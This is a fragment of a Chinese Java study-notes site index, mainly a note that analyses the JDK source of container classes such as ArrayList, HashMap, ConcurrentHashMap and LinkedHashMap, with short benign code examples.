Java 不支持多重继承，只能通过实现多个接口来达到相同目的，而 C++ 支持多重继承。 Java 不支持操作符重载，虽然可以对两个 String 对象执行加法运算，但是这是语言内置支持的操作，不属于操作符重载，而 C++ 可以。 Java 的 goto 是保留字，但是不可用，C++ 可以使用 goto。  What are the main differences between Java and C++?\nJRE or JDK     JRE：Java Runtime Environment，Java 运行环境的简称，为 Java 的运行提供了所需的环境。它是一个 JVM 程序，主要包括了 JVM 的标准实现和一些 Java 基本类库。 JDK：Java Development Kit，Java 开发工具包，提供了 Java 的开发及运行环境。JDK 是 Java 开发的核心，集成了 JRE 以及一些其它的工具，比如编译 Java 源码的编译器 javac 等。  参考资料     Eckel B. Java 编程思想[M]. 机械工业出版社, 2002. Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.  "},{"id":213,"href":"/%E7%AC%94%E8%AE%B0/JavaJava-%E5%AE%B9%E5%99%A8/","title":"Java 容器","parent":"笔记","content":"Java 容器     Java 容器  一、概览  Collection Map   二、容器中的设计模式  迭代器模式 适配器模式   三、源码分析  ArrayList Vector CopyOnWriteArrayList LinkedList HashMap ConcurrentHashMap LinkedHashMap WeakHashMap   参考资料    一、概览    容器主要包括 Collection 和 Map 两种，Collection 存储着对象的集合，而 Map 存储着键值对（两个对象）的映射表。\nCollection    \n1. Set      TreeSet：基于红黑树实现，支持有序性操作，例如根据一个范围查找元素的操作。但是查找效率不如 HashSet，HashSet 查找的时间复杂度为 O(1)，TreeSet 则为 O(logN)。\n  HashSet：基于哈希表实现，支持快速查找，但不支持有序性操作。并且失去了元素的插入顺序信息，也就是说使用 Iterator 遍历 HashSet 得到的结果是不确定的。\n  LinkedHashSet：具有 HashSet 的查找效率，并且内部使用双向链表维护元素的插入顺序。\n  2. List      ArrayList：基于动态数组实现，支持随机访问。\n  Vector：和 ArrayList 类似，但它是线程安全的。\n  LinkedList：基于双向链表实现，只能顺序访问，但是可以快速地在链表中间插入和删除元素。不仅如此，LinkedList 还可以用作栈、队列和双向队列。\n  3. Queue      LinkedList：可以用它来实现双向队列。\n  PriorityQueue：基于堆结构实现，可以用它来实现优先队列。\n  Map    \n  TreeMap：基于红黑树实现。\n  HashMap：基于哈希表实现。\n  HashTable：和 HashMap 类似，但它是线程安全的，这意味着同一时刻多个线程同时写入 HashTable 不会导致数据不一致。它是遗留类，不应该去使用它，而是使用 ConcurrentHashMap 来支持线程安全，ConcurrentHashMap 的效率会更高，因为 ConcurrentHashMap 引入了分段锁。\n  LinkedHashMap：使用双向链表来维护元素的顺序，顺序为插入顺序或者最近最少使用（LRU）顺序。\n  二、容器中的设计模式    迭代器模式    \nCollection 继承了 Iterable 接口，其中的 iterator() 方法能够产生一个 Iterator 对象，通过这个对象就可以迭代遍历 Collection 中的元素。\n从 JDK 1.5 之后可以使用 foreach 方法来遍历实现了 Iterable 接口的聚合对象。\nList\u0026lt;String\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); list.add(\u0026#34;a\u0026#34;); list.add(\u0026#34;b\u0026#34;); for (String item : list) { System.out.println(item); } 适配器模式    java.util.Arrays#asList() 可以把数组类型转换为 List 类型。\n@SafeVarargs public static \u0026lt;T\u0026gt; List\u0026lt;T\u0026gt; asList(T... a) 应该注意的是 asList() 的参数为泛型的变长参数，不能使用基本类型数组作为参数，只能使用相应的包装类型数组。\nInteger[] arr = {1, 2, 3}; List list = Arrays.asList(arr); 也可以使用以下方式调用 asList()：\nList list = Arrays.asList(1, 2, 3); 三、源码分析    如果没有特别说明，以下源码分析基于 JDK 1.8。\n在 IDEA 中 double shift 调出 Search EveryWhere，查找源码文件，找到之后就可以阅读源码。\nArrayList    1. 概览    因为 ArrayList 是基于数组实现的，所以支持快速随机访问。RandomAccess 接口标识着该类支持快速随机访问。\npublic class ArrayList\u0026lt;E\u0026gt; extends AbstractList\u0026lt;E\u0026gt; implements List\u0026lt;E\u0026gt;, RandomAccess, Cloneable, java.io.Serializable 数组的默认大小为 10。\nprivate static final int DEFAULT_CAPACITY = 10; \n2. 扩容    添加元素时使用 ensureCapacityInternal() 方法来保证容量足够，如果不够时，需要使用 grow() 方法进行扩容，新容量的大小为 oldCapacity + (oldCapacity \u0026gt;\u0026gt; 1)，即 oldCapacity+oldCapacity/2。其中 oldCapacity \u0026raquo; 1 需要取整，所以新容量大约是旧容量的 1.5 倍左右。（oldCapacity 为偶数就是 1.5 倍，为奇数就是 1.5 倍-0.5）\n扩容操作需要调用 Arrays.copyOf() 把原数组整个复制到新数组中，这个操作代价很高，因此最好在创建 ArrayList 对象时就指定大概的容量大小，减少扩容操作的次数。\npublic boolean add(E e) { ensureCapacityInternal(size + 1); // Increments modCount!!  elementData[size++] = e; return true; } private void ensureCapacityInternal(int minCapacity) { if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) { minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); } ensureExplicitCapacity(minCapacity); } private void ensureExplicitCapacity(int minCapacity) { modCount++; // overflow-conscious code  if (minCapacity - elementData.length \u0026gt; 0) grow(minCapacity); } private void grow(int minCapacity) { // overflow-conscious code  int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity \u0026gt;\u0026gt; 1); if (newCapacity - minCapacity \u0026lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE \u0026gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win:  elementData = Arrays.copyOf(elementData, newCapacity); } 3. 删除元素    需要调用 System.arraycopy() 将 index+1 后面的元素都复制到 index 位置上，该操作的时间复杂度为 O(N)，可以看到 ArrayList 删除元素的代价是非常高的。\npublic E remove(int index) { rangeCheck(index); modCount++; E oldValue = elementData(index); int numMoved = size - index - 1; if (numMoved \u0026gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work  return oldValue; } 4. 序列化    ArrayList 基于数组实现，并且具有动态扩容特性，因此保存元素的数组不一定都会被使用，那么就没必要全部进行序列化。\n保存元素的数组 elementData 使用 transient 修饰，该关键字声明数组默认不会被序列化。\ntransient Object[] elementData; // non-private to simplify nested class access ArrayList 实现了 writeObject() 和 readObject() 来控制只序列化数组中有元素填充那部分内容。\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { elementData = EMPTY_ELEMENTDATA; // Read in size, and any hidden stuff  s.defaultReadObject(); // Read in capacity  s.readInt(); // ignored  if (size \u0026gt; 0) { // be like clone(), allocate array based upon size not capacity  ensureCapacityInternal(size); Object[] a = elementData; // Read in all elements in the proper order.  for (int i=0; i\u0026lt;size; i++) { a[i] = s.readObject(); } } } private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException{ // Write out element count, and any hidden stuff  int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone()  s.writeInt(size); // Write out all elements in the proper order.  for (int i=0; i\u0026lt;size; i++) { s.writeObject(elementData[i]); } if (modCount != expectedModCount) { throw new ConcurrentModificationException(); } } 序列化时需要使用 ObjectOutputStream 的 writeObject() 将对象转换为字节流并输出。而 writeObject() 方法在传入的对象存在 writeObject() 的时候会去反射调用该对象的 writeObject() 来实现序列化。反序列化使用的是 ObjectInputStream 的 readObject() 方法，原理类似。\nArrayList list = new ArrayList(); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(list); 5. Fail-Fast    modCount 用来记录 ArrayList 结构发生变化的次数。结构发生变化是指添加或者删除至少一个元素的所有操作，或者是调整内部数组的大小，仅仅只是设置元素的值不算结构发生变化。\n在进行序列化或者迭代等操作时，需要比较操作前后 modCount 是否改变，如果改变了需要抛出 ConcurrentModificationException。代码参考上节序列化中的 writeObject() 方法。\nVector    1. 同步    它的实现与 ArrayList 类似，但是使用了 synchronized 进行同步。\npublic synchronized boolean add(E e) { modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true; } public synchronized E get(int index) { if (index \u0026gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); return elementData(index); } 2. 扩容    Vector 的构造函数可以传入 capacityIncrement 参数，它的作用是在扩容时使容量 capacity 增长 capacityIncrement。如果这个参数的值小于等于 0，扩容时每次都令 capacity 为原来的两倍。\npublic Vector(int initialCapacity, int capacityIncrement) { super(); if (initialCapacity \u0026lt; 0) throw new IllegalArgumentException(\u0026#34;Illegal Capacity: \u0026#34;+ initialCapacity); this.elementData = new Object[initialCapacity]; this.capacityIncrement = capacityIncrement; } private void grow(int minCapacity) { // overflow-conscious code  int oldCapacity = elementData.length; int newCapacity = oldCapacity + ((capacityIncrement \u0026gt; 0) ? capacityIncrement : oldCapacity); if (newCapacity - minCapacity \u0026lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE \u0026gt; 0) newCapacity = hugeCapacity(minCapacity); elementData = Arrays.copyOf(elementData, newCapacity); } 调用没有 capacityIncrement 的构造函数时，capacityIncrement 值被设置为 0，也就是说默认情况下 Vector 每次扩容时容量都会翻倍。\npublic Vector(int initialCapacity) { this(initialCapacity, 0); } public Vector() { this(10); } 3. 与 ArrayList 的比较     Vector 是同步的，因此开销就比 ArrayList 要大，访问速度更慢。最好使用 ArrayList 而不是 Vector，因为同步操作完全可以由程序员自己来控制； Vector 每次扩容请求其大小的 2 倍（也可以通过构造函数设置增长的容量），而 ArrayList 是 1.5 倍。  4. 替代方案    可以使用 Collections.synchronizedList(); 得到一个线程安全的 ArrayList。\nList\u0026lt;String\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;String\u0026gt; synList = Collections.synchronizedList(list); 也可以使用 concurrent 并发包下的 CopyOnWriteArrayList 类。\nList\u0026lt;String\u0026gt; list = new CopyOnWriteArrayList\u0026lt;\u0026gt;(); CopyOnWriteArrayList    1. 读写分离    写操作在一个复制的数组上进行，读操作还是在原始数组中进行，读写分离，互不影响。\n写操作需要加锁，防止并发写入时导致写入数据丢失。\n写操作结束之后需要把原始数组指向新的复制数组。\npublic boolean add(E e) { final ReentrantLock lock = this.lock; lock.lock(); try { Object[] elements = getArray(); int len = elements.length; Object[] newElements = Arrays.copyOf(elements, len + 1); newElements[len] = e; setArray(newElements); return true; } finally { lock.unlock(); } } final void setArray(Object[] a) { array = a; } @SuppressWarnings(\u0026#34;unchecked\u0026#34;) private E get(Object[] a, int index) { return (E) a[index]; } 2. 适用场景    CopyOnWriteArrayList 在写操作的同时允许读操作，大大提高了读操作的性能，因此很适合读多写少的应用场景。\n但是 CopyOnWriteArrayList 有其缺陷：\n 内存占用：在写操作时需要复制一个新的数组，使得内存占用为原来的两倍左右； 数据不一致：读操作不能读取实时性的数据，因为部分写操作的数据还未同步到读数组中。  所以 CopyOnWriteArrayList 不适合内存敏感以及对实时性要求很高的场景。\nLinkedList    1. 概览    基于双向链表实现，使用 Node 存储链表节点信息。\nprivate static class Node\u0026lt;E\u0026gt; { E item; Node\u0026lt;E\u0026gt; next; Node\u0026lt;E\u0026gt; prev; } 每个链表存储了 first 和 last 指针：\ntransient Node\u0026lt;E\u0026gt; first; transient Node\u0026lt;E\u0026gt; last; \n2. 与 ArrayList 的比较    ArrayList 基于动态数组实现，LinkedList 基于双向链表实现。ArrayList 和 LinkedList 的区别可以归结为数组和链表的区别：\n 数组支持随机访问，但插入删除的代价很高，需要移动大量元素； 链表不支持随机访问，但插入删除只需要改变指针。  HashMap    为了便于理解，以下源码分析以 JDK 1.7 为主。\n1. 存储结构    内部包含了一个 Entry 类型的数组 table。Entry 存储着键值对。它包含了四个字段，从 next 字段我们可以看出 Entry 是一个链表。即数组中的每个位置被当成一个桶，一个桶存放一个链表。HashMap 使用拉链法来解决冲突，同一个链表中存放哈希值和散列桶取模运算结果相同的 Entry。\n\ntransient Entry[] table; static class Entry\u0026lt;K,V\u0026gt; implements Map.Entry\u0026lt;K,V\u0026gt; { final K key; V value; Entry\u0026lt;K,V\u0026gt; next; int hash; Entry(int h, K k, V v, Entry\u0026lt;K,V\u0026gt; n) { value = v; next = n; key = k; hash = h; } public final K getKey() { return key; } public final V getValue() { return value; } public final V setValue(V newValue) { V oldValue = value; value = newValue; return oldValue; } public final boolean equals(Object o) { if (!(o instanceof Map.Entry)) return false; Map.Entry e = (Map.Entry)o; Object k1 = getKey(); Object k2 = e.getKey(); if (k1 == k2 || (k1 != null \u0026amp;\u0026amp; k1.equals(k2))) { Object v1 = getValue(); Object v2 = e.getValue(); if (v1 == v2 || (v1 != null \u0026amp;\u0026amp; v1.equals(v2))) return true; } return false; } public final int hashCode() { return Objects.hashCode(getKey()) ^ Objects.hashCode(getValue()); } public final String toString() { return getKey() + \u0026#34;=\u0026#34; + getValue(); } } 2. 拉链法的工作原理    HashMap\u0026lt;String, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;K1\u0026#34;, \u0026#34;V1\u0026#34;); map.put(\u0026#34;K2\u0026#34;, \u0026#34;V2\u0026#34;); map.put(\u0026#34;K3\u0026#34;, \u0026#34;V3\u0026#34;);  新建一个 HashMap，默认大小为 16； 插入 \u0026lt;K1,V1\u0026gt; 键值对，先计算 K1 的 hashCode 为 115，使用除留余数法得到所在的桶下标 115%16=3。 插入 \u0026lt;K2,V2\u0026gt; 键值对，先计算 K2 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6。 插入 \u0026lt;K3,V3\u0026gt; 键值对，先计算 K3 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6，插在 \u0026lt;K2,V2\u0026gt; 前面。  应该注意到链表的插入是以头插法方式进行的，例如上面的 \u0026lt;K3,V3\u0026gt; 不是插在 \u0026lt;K2,V2\u0026gt; 后面，而是插入在链表头部。\n查找需要分成两步进行：\n 计算键值对所在的桶； 在链表上顺序查找，时间复杂度显然和链表的长度成正比。  \n3. put 操作    public V put(K key, V value) { if (table == EMPTY_TABLE) { inflateTable(threshold); } // 键为 null 单独处理  if (key == null) return putForNullKey(value); int hash = hash(key); // 确定桶下标  int i = indexFor(hash, table.length); // 先找出是否已经存在键为 key 的键值对，如果存在的话就更新这个键值对的值为 value  for (Entry\u0026lt;K,V\u0026gt; e = table[i]; e != null; e = e.next) { Object k; if (e.hash == hash \u0026amp;\u0026amp; ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; // 插入新键值对  addEntry(hash, key, value, i); return null; } HashMap 允许插入键为 null 的键值对。但是因为无法调用 null 的 hashCode() 方法，也就无法确定该键值对的桶下标，只能通过强制指定一个桶下标来存放。HashMap 使用第 0 个桶存放键为 null 的键值对。\nprivate V putForNullKey(V value) { for (Entry\u0026lt;K,V\u0026gt; e = table[0]; e != null; e = e.next) { if (e.key == null) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(0, null, value, 0); return null; } 使用链表的头插法，也就是新的键值对插在链表的头部，而不是链表的尾部。\nvoid addEntry(int hash, K key, V value, int bucketIndex) { if ((size \u0026gt;= threshold) \u0026amp;\u0026amp; (null != table[bucketIndex])) { resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); } createEntry(hash, key, value, bucketIndex); } void createEntry(int hash, K key, V value, int bucketIndex) { Entry\u0026lt;K,V\u0026gt; e = table[bucketIndex]; // 头插法，链表头部指向新的键值对  table[bucketIndex] = new Entry\u0026lt;\u0026gt;(hash, key, value, e); size++; } Entry(int h, K k, V v, Entry\u0026lt;K,V\u0026gt; n) { value = v; next = n; key = k; hash = h; } 4. 确定桶下标    很多操作都需要先确定一个键值对所在的桶下标。\nint hash = hash(key); int i = indexFor(hash, table.length); 4.1 计算 hash 值\nfinal int hash(Object k) { int h = hashSeed; if (0 != h \u0026amp;\u0026amp; k instanceof String) { return sun.misc.Hashing.stringHash32((String) k); } h ^= k.hashCode(); // This function ensures that hashCodes that differ only by  // constant multiples at each bit position have a bounded  // number of collisions (approximately 8 at default load factor).  h ^= (h \u0026gt;\u0026gt;\u0026gt; 20) ^ (h \u0026gt;\u0026gt;\u0026gt; 12); return h ^ (h \u0026gt;\u0026gt;\u0026gt; 7) ^ (h \u0026gt;\u0026gt;\u0026gt; 4); } public final int hashCode() { return Objects.hashCode(key) ^ Objects.hashCode(value); } 4.2 取模\n令 x = 1\u0026lt;\u0026lt;4，即 x 为 2 的 4 次方，它具有以下性质：\nx : 00010000 x-1 : 00001111 令一个数 y 与 x-1 做与运算，可以去除 y 位级表示的第 4 位以上数：\ny : 10110010 x-1 : 00001111 y\u0026amp;(x-1) : 00000010 这个性质和 y 对 x 取模效果是一样的：\ny : 10110010 x : 00010000 y%x : 00000010 我们知道，位运算的代价比求模运算小的多，因此在进行这种计算时用位运算的话能带来更高的性能。\n确定桶下标的最后一步是将 key 的 hash 值对桶个数取模：hash%capacity，如果能保证 capacity 为 2 的 n 次方，那么就可以将这个操作转换为位运算。\nstatic int indexFor(int h, int length) { return h \u0026amp; (length-1); } 5. 扩容-基本原理    设 HashMap 的 table 长度为 M，需要存储的键值对数量为 N，如果哈希函数满足均匀性的要求，那么每条链表的长度大约为 N/M，因此查找的复杂度为 O(N/M)。\n为了让查找的成本降低，应该使 N/M 尽可能小，因此需要保证 M 尽可能大，也就是说 table 要尽可能大。HashMap 采用动态扩容来根据当前的 N 值来调整 M 值，使得空间效率和时间效率都能得到保证。\n和扩容相关的参数主要有：capacity、size、threshold 和 load_factor。\n   参数 含义     capacity table 的容量大小，默认为 16。需要注意的是 capacity 必须保证为 2 的 n 次方。   size 键值对数量。   threshold size 的临界值，当 size 大于等于 threshold 就必须进行扩容操作。   loadFactor 装载因子，table 能够使用的比例，threshold = (int)(capacity* loadFactor)。    static final int DEFAULT_INITIAL_CAPACITY = 16; static final int MAXIMUM_CAPACITY = 1 \u0026lt;\u0026lt; 30; static final float DEFAULT_LOAD_FACTOR = 0.75f; transient Entry[] table; transient int size; int threshold; final float loadFactor; transient int modCount; 从下面的添加元素代码中可以看出，当需要扩容时，令 capacity 为原来的两倍。\nvoid addEntry(int hash, K key, V value, int bucketIndex) { Entry\u0026lt;K,V\u0026gt; e = table[bucketIndex]; table[bucketIndex] = new Entry\u0026lt;\u0026gt;(hash, key, value, e); if (size++ \u0026gt;= threshold) resize(2 * table.length); } 扩容使用 resize() 实现，需要注意的是，扩容操作同样需要把 oldTable 的所有键值对重新插入 newTable 中，因此这一步是很费时的。\nvoid resize(int newCapacity) { Entry[] oldTable = table; int oldCapacity = oldTable.length; if (oldCapacity == MAXIMUM_CAPACITY) { threshold = Integer.MAX_VALUE; return; } Entry[] newTable = new Entry[newCapacity]; transfer(newTable); table = newTable; threshold = (int)(newCapacity * loadFactor); } void transfer(Entry[] newTable) { Entry[] src = table; int newCapacity = newTable.length; for (int j = 0; j \u0026lt; src.length; j++) { Entry\u0026lt;K,V\u0026gt; e = src[j]; if (e != null) { src[j] = null; do { Entry\u0026lt;K,V\u0026gt; next = e.next; int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next; } while (e != null); } } } 6. 扩容-重新计算桶下标    在进行扩容时，需要把键值对重新计算桶下标，从而放到对应的桶上。在前面提到，HashMap 使用 hash%capacity 来确定桶下标。HashMap capacity 为 2 的 n 次方这一特点能够极大降低重新计算桶下标操作的复杂度。\n假设原数组长度 capacity 为 16，扩容之后 new capacity 为 32：\ncapacity : 00010000 new capacity : 00100000 对于一个 Key，它的哈希值 hash 在第 5 位：\n 为 0，那么 hash%00010000 = hash%00100000，桶位置和原来一致； 为 1，hash%00010000 = hash%00100000 + 16，桶位置是原位置 + 16。  7. 计算数组容量    HashMap 构造函数允许用户传入的容量不是 2 的 n 次方，因为它可以自动地将传入的容量转换为 2 的 n 次方。\n先考虑如何求一个数的掩码，对于 10010000，它的掩码为 11111111，可以使用以下方法得到：\nmask |= mask \u0026gt;\u0026gt; 1 11011000 mask |= mask \u0026gt;\u0026gt; 2 11111110 mask |= mask \u0026gt;\u0026gt; 4 11111111 mask+1 是大于原始数字的最小的 2 的 n 次方。\nnum 10010000 mask+1 100000000 以下是 HashMap 中计算数组容量的代码：\nstatic final int tableSizeFor(int cap) { int n = cap - 1; n |= n \u0026gt;\u0026gt;\u0026gt; 1; n |= n \u0026gt;\u0026gt;\u0026gt; 2; n |= n \u0026gt;\u0026gt;\u0026gt; 4; n |= n \u0026gt;\u0026gt;\u0026gt; 8; n |= n \u0026gt;\u0026gt;\u0026gt; 16; return (n \u0026lt; 0) ? 1 : (n \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1; } 8. 链表转红黑树    从 JDK 1.8 开始，一个桶存储的链表长度大于等于 8 时会将链表转换为红黑树。\n9. 与 Hashtable 的比较     Hashtable 使用 synchronized 来进行同步。 HashMap 可以插入键为 null 的 Entry。 HashMap 的迭代器是 fail-fast 迭代器。 HashMap 不能保证随着时间的推移 Map 中的元素次序是不变的。  ConcurrentHashMap    1. 存储结构    \nstatic final class HashEntry\u0026lt;K,V\u0026gt; { final int hash; final K key; volatile V value; volatile HashEntry\u0026lt;K,V\u0026gt; next; } ConcurrentHashMap 和 HashMap 实现上类似，最主要的差别是 ConcurrentHashMap 采用了分段锁（Segment），每个分段锁维护着几个桶（HashEntry），多个线程可以同时访问不同分段锁上的桶，从而使其并发度更高（并发度就是 Segment 的个数）。\nSegment 继承自 ReentrantLock。\nstatic final class Segment\u0026lt;K,V\u0026gt; extends ReentrantLock implements Serializable { private static final long serialVersionUID = 2249069246763182397L; static final int MAX_SCAN_RETRIES = Runtime.getRuntime().availableProcessors() \u0026gt; 1 ? 64 : 1; transient volatile HashEntry\u0026lt;K,V\u0026gt;[] table; transient int count; transient int modCount; transient int threshold; final float loadFactor; } final Segment\u0026lt;K,V\u0026gt;[] segments; 默认的并发级别为 16，也就是说默认创建 16 个 Segment。\nstatic final int DEFAULT_CONCURRENCY_LEVEL = 16; 2. size 操作    每个 Segment 维护了一个 count 变量来统计该 Segment 中的键值对个数。\n/** * The number of elements. Accessed only either within locks * or among other volatile reads that maintain visibility. */ transient int count; 在执行 size 操作时，需要遍历所有 Segment 然后把 count 累计起来。\nConcurrentHashMap 在执行 size 操作时先尝试不加锁，如果连续两次不加锁操作得到的结果一致，那么可以认为这个结果是正确的。\n尝试次数使用 RETRIES_BEFORE_LOCK 定义，该值为 2，retries 初始值为 -1，因此尝试次数为 3。\n如果尝试的次数超过 3 次，就需要对每个 Segment 加锁。\n/** * Number of unsynchronized retries in size and containsValue * methods before resorting to locking. This is used to avoid * unbounded retries if tables undergo continuous modification * which would make it impossible to obtain an accurate result. */ static final int RETRIES_BEFORE_LOCK = 2; public int size() { // Try a few times to get accurate count. On failure due to  // continuous async changes in table, resort to locking.  final Segment\u0026lt;K,V\u0026gt;[] segments = this.segments; int size; boolean overflow; // true if size overflows 32 bits  long sum; // sum of modCounts  long last = 0L; // previous sum  int retries = -1; // first iteration isn\u0026#39;t retry  try { for (;;) { // 超过尝试次数，则对每个 Segment 加锁  if (retries++ == RETRIES_BEFORE_LOCK) { for (int j = 0; j \u0026lt; segments.length; ++j) ensureSegment(j).lock(); // force creation  } sum = 0L; size = 0; overflow = false; for (int j = 0; j \u0026lt; segments.length; ++j) { Segment\u0026lt;K,V\u0026gt; seg = segmentAt(segments, j); if (seg != null) { sum += seg.modCount; int c = seg.count; if (c \u0026lt; 0 || (size += c) \u0026lt; 0) overflow = true; } } // 连续两次得到的结果一致，则认为这个结果是正确的  if (sum == last) break; last = sum; } } finally { if (retries \u0026gt; RETRIES_BEFORE_LOCK) { for (int j = 0; j \u0026lt; segments.length; ++j) segmentAt(segments, j).unlock(); } } return overflow ? Integer.MAX_VALUE : size; } 3. JDK 1.8 的改动    JDK 1.7 使用分段锁机制来实现并发更新操作，核心类为 Segment，它继承自重入锁 ReentrantLock，并发度与 Segment 数量相等。\nJDK 1.8 使用了 CAS 操作来支持更高的并发度，在 CAS 操作失败时使用内置锁 synchronized。\n并且 JDK 1.8 的实现也在链表过长时会转换为红黑树。\nLinkedHashMap    存储结构    继承自 HashMap，因此具有和 HashMap 一样的快速查找特性。\npublic class LinkedHashMap\u0026lt;K,V\u0026gt; extends HashMap\u0026lt;K,V\u0026gt; implements Map\u0026lt;K,V\u0026gt; 内部维护了一个双向链表，用来维护插入顺序或者 LRU 顺序。\n/** * The head (eldest) of the doubly linked list. */ transient LinkedHashMap.Entry\u0026lt;K,V\u0026gt; head; /** * The tail (youngest) of the doubly linked list. */ transient LinkedHashMap.Entry\u0026lt;K,V\u0026gt; tail; accessOrder 决定了顺序，默认为 false，此时维护的是插入顺序。\nfinal boolean accessOrder; LinkedHashMap 最重要的是以下用于维护顺序的函数，它们会在 put、get 等方法中调用。\nvoid afterNodeAccess(Node\u0026lt;K,V\u0026gt; p) { } void afterNodeInsertion(boolean evict) { } afterNodeAccess()    当一个节点被访问时，如果 accessOrder 为 true，则会将该节点移到链表尾部。也就是说指定为 LRU 顺序之后，在每次访问一个节点时，会将这个节点移到链表尾部，保证链表尾部是最近访问的节点，那么链表首部就是最近最久未使用的节点。\nvoid afterNodeAccess(Node\u0026lt;K,V\u0026gt; e) { // move node to last  LinkedHashMap.Entry\u0026lt;K,V\u0026gt; last; if (accessOrder \u0026amp;\u0026amp; (last = tail) != e) { LinkedHashMap.Entry\u0026lt;K,V\u0026gt; p = (LinkedHashMap.Entry\u0026lt;K,V\u0026gt;)e, b = p.before, a = p.after; p.after = null; if (b == null) head = a; else b.after = a; if (a != null) a.before = b; else last = b; if (last == null) head = p; else { p.before = last; last.after = p; } tail = p; ++modCount; } } afterNodeInsertion()    在 put 等操作之后执行，当 removeEldestEntry() 方法返回 true 时会移除最晚的节点，也就是链表首部节点 first。\nevict 只有在构建 Map 的时候才为 false，在这里为 true。\nvoid afterNodeInsertion(boolean evict) { // possibly remove eldest  LinkedHashMap.Entry\u0026lt;K,V\u0026gt; first; if (evict \u0026amp;\u0026amp; (first = head) != null \u0026amp;\u0026amp; removeEldestEntry(first)) { K key = first.key; removeNode(hash(key), key, null, false, true); } } removeEldestEntry() 默认为 false，如果需要让它为 true，需要继承 LinkedHashMap 并且覆盖这个方法的实现，这在实现 LRU 的缓存中特别有用，通过移除最近最久未使用的节点，从而保证缓存空间足够，并且缓存的数据都是热点数据。\nprotected boolean removeEldestEntry(Map.Entry\u0026lt;K,V\u0026gt; eldest) { return false; } LRU 缓存    以下是使用 LinkedHashMap 实现的一个 LRU 缓存：\n 设定最大缓存空间 MAX_ENTRIES 为 3； 使用 LinkedHashMap 的构造函数将 accessOrder 设置为 true，开启 LRU 顺序； 覆盖 removeEldestEntry() 方法实现，在节点多于 MAX_ENTRIES 就会将最近最久未使用的数据移除。  class LRUCache\u0026lt;K, V\u0026gt; extends LinkedHashMap\u0026lt;K, V\u0026gt; { private static final int MAX_ENTRIES = 3; protected boolean removeEldestEntry(Map.Entry eldest) { return size() \u0026gt; MAX_ENTRIES; } LRUCache() { super(MAX_ENTRIES, 0.75f, true); } } public static void main(String[] args) { LRUCache\u0026lt;Integer, String\u0026gt; cache = new LRUCache\u0026lt;\u0026gt;(); cache.put(1, \u0026#34;a\u0026#34;); cache.put(2, \u0026#34;b\u0026#34;); cache.put(3, \u0026#34;c\u0026#34;); cache.get(1); cache.put(4, \u0026#34;d\u0026#34;); System.out.println(cache.keySet()); } [3, 1, 4] WeakHashMap    存储结构    WeakHashMap 的 Entry 继承自 WeakReference，被 WeakReference 关联的对象在下一次垃圾回收时会被回收。\nWeakHashMap 主要用来实现缓存，通过使用 WeakHashMap 来引用缓存对象，由 JVM 对这部分缓存进行回收。\nprivate static class Entry\u0026lt;K,V\u0026gt; extends WeakReference\u0026lt;Object\u0026gt; implements Map.Entry\u0026lt;K,V\u0026gt; ConcurrentCache    Tomcat 中的 ConcurrentCache 使用了 WeakHashMap 来实现缓存功能。\nConcurrentCache 采取的是分代缓存：\n 经常使用的对象放入 eden 中，eden 使用 ConcurrentHashMap 实现，不用担心会被回收（伊甸园）； 不常用的对象放入 longterm，longterm 使用 WeakHashMap 实现，这些老对象会被垃圾收集器回收。 当调用 get() 方法时，会先从 eden 区获取，如果没有找到的话再到 longterm 获取，当从 longterm 获取到就把对象放入 eden 中，从而保证经常被访问的节点不容易被回收。 当调用 put() 方法时，如果 eden 的大小超过了 size，那么就将 eden 中的所有对象都放入 longterm 中，利用虚拟机回收掉一部分不经常使用的对象。  public final class ConcurrentCache\u0026lt;K, V\u0026gt; { private final int size; private final Map\u0026lt;K, V\u0026gt; eden; private final Map\u0026lt;K, V\u0026gt; longterm; public ConcurrentCache(int size) { this.size = size; this.eden = new ConcurrentHashMap\u0026lt;\u0026gt;(size); this.longterm = new WeakHashMap\u0026lt;\u0026gt;(size); } public V get(K k) { V v = this.eden.get(k); if (v == null) { v = this.longterm.get(k); if (v != null) this.eden.put(k, v); } return v; } public void put(K k, V v) { if (this.eden.size() \u0026gt;= size) { this.longterm.putAll(this.eden); this.eden.clear(); } this.eden.put(k, v); } } 参考资料     Eckel B. Java 编程思想 [M]. 机械工业出版社, 2002. Java Collection Framework Iterator 模式 Java 8 系列之重新认识 HashMap What is difference between HashMap and Hashtable in Java? Java 集合之 HashMap The principle of ConcurrentHashMap analysis 探索 ConcurrentHashMap 高并发性的实现机制 HashMap 相关面试题及其解答 Java 集合细节（二）：asList 的缺陷 Java Collection Framework – The LinkedList Class  "},{"id":214,"href":"/%E7%AC%94%E8%AE%B0/JavaJava-%E5%B9%B6%E5%8F%91/","title":"Java 并发","parent":"笔记","content":"Java 并发     Java 并发  一、使用线程  实现 Runnable 接口 实现 Callable 接口 继承 Thread 类 实现接口 VS 继承 Thread   二、基础线程机制  Executor Daemon sleep() yield()   